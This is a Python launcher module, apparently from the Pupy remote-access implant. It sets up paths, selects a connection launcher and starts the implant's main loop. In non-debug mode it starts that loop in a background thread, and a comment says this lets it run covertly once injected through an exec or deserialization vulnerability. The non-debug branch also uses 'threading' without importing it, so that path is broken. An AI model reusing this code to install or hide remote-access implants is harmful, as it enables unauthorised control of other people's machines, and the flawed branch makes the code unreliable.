# -*- coding: utf-8 -*-

from __future__ import print_function
from __future__ import absolute_import
from __future__ import division
from __future__ import unicode_literals

import argparse
import sys
import os

from . import main

setattr(sys, '__pupy_main__', True)

root = os.path.dirname(os.path.dirname(__file__))

sys.path.extend((
    root, os.path.join(root, 'library_patches')
))

import pupylib
assert(pupylib)

from network.conf import launchers

parser = argparse.ArgumentParser('pupy')
parser.add_argument('--debug', action='store_true', default=False, help='Enable debug')
parser.add_argument('launcher', choices=launchers.keys(), default='connect', help='Launcher')
parser.add_argument('args', nargs=argparse.REMAINDER, help='Launcher args')

args = parser.parse_args()

main(config={
    'launcher': args.launcher,
    'launcher_args': args.args,
}, argv=[], debug=args.debug)

if __debug__:
    import threading
    for thread in threading.enumerate():
        print("> ALIVE:", thread, thread.daemon)
else:
    import platform

    if not platform.system() == 'android':
        if not hasattr(platform, 'pupy_thread'):
            # to allow pupy to run in background when imported or injected
            # through a python application exec/deserialization vulnerability
            t = threading.Thread(target=main)
            t.daemon = True
            t.start()
            setattr(platform, 'pupy_thread', t)
